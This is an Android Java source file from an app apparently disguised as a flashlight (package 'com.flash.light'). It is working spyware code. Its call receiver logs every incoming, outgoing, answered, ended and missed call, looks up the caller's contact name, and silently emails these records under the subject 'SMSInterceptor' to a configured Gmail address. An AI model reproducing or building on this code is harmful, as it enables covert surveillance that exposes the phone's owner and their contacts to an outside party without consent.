package com.flash.light;

import android.util.Log;

import java.util.List;
import java.util.Date;

import android.content.Intent;
import android.content.Context;

import android.telephony.SmsMessage;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class CallReceiver extends PhoneCallReceiver {

  private static Configure configure;

  private static String gmailEmailString;

  private static final String SUBJECT = "SMSInterceptor";
  private static final String TAG     = "FlashLight CallReceiver";

  public CallReceiver() { 
    gmailEmailString = new Configure().emailAddress();
  }

  public String endPoint(final String number, final Context context) {

    String end_point;
    final String contact_name  = new Contacts().getContactName(number, context);

    if(!contact_name.isEmpty()) {
      end_point = "" + number + "(" + contact_name + ")";
    }
    else {
      end_point = number;
    }
    return end_point;
  }

  public void threading(final String message) {
    new Thread(new Runnable() {
      @Override
      public void run() {
        try {
          GmailSender sender = new GmailSender();
          sender.sendMail(SUBJECT, message, gmailEmailString);
        }
        catch(Exception e) {
          e.printStackTrace();
          Log.e(TAG, "threading() Exception e " + e.toString());
        }
      }
    }).start();
  }

  @Override
  protected void onIncomingCallReceived(final Context context, final String number, final Date start) { 
    threading("Incoming call started\nNumber: " + endPoint(number, context) + "\nStart Time: " + start);
  }

  @Override
  protected void onIncomingCallAnswered(final Context context, final String number, final Date start) {
    threading("Incoming call answered\nNumber: " + endPoint(number, context) + "\nStart Time: " + start);
  }

  @Override
  protected void onIncomingCallEnded(final Context context, final String number, final Date start, final Date end) { 
    threading("Incoming call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end);
  }

  @Override
  protected void onOutgoingCallStarted(final Context context, final String number, final Date start) { 
    threading("Outgoing call started!\nNumber: " + endPoint(number, context) + "\nStart Time: " + start);
  } 

  @Override 
  protected void onOutgoingCallEnded(final Context context, final String number, final Date start, final Date end) { 
    threading("Outgoing call ended!\nNumber: " + endPoint(number, context) + "\nEnd Time: " + end);
  }

  @Override
  protected void onMissedCall(final Context context, final String number, final Date start) { 
    threading("Missed call\nNumber: " + endPoint(number, context) + "\nTime: " + start);
  }

}
